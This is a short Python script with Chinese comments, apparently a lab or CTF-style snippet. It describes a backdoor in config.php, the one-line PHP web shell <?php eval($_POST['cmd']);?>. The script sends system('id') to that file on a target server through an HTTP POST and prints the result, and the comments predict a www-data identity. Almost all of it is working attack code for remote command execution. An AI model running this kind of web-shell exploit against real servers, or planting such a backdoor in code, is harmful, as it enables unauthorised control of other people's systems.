# 原有在config.php文件中存在远程命令执行后面
# 代码如下：
# <?php eval($_POST['cmd']);?>
# 通过如下操作发送对应是system()函数后，一般会得到回应，值一般是
# uid = 33(www-data) gid = 33(www-data) groups = 33(www-data)
import requests

url = "http://1.1.1.1/config.php"
data = {
            "cmd" : "system('id');"
        }

response = requests.post(url,data)
print(response.text)
